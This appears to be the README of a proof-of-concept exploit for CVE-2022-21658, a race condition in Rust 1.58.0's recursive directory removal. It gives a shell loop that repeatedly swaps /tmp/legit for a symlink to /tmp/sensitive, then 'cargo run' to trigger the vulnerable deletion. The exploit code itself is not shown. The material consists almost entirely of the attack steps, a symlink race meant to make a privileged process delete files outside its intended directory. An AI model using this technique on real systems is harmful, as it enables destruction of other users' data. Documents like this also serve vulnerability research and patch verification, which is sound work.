# CVE-2022-21658 poc

**Make sure the use the Rust 1.58.0 version**.

First run:
```sh
while :; do mkdir /tmp/legit; rm -r /tmp/legit; ln -s /tmp/sensitive /tmp/legit; done
```

Then:
```sh
cargo run
```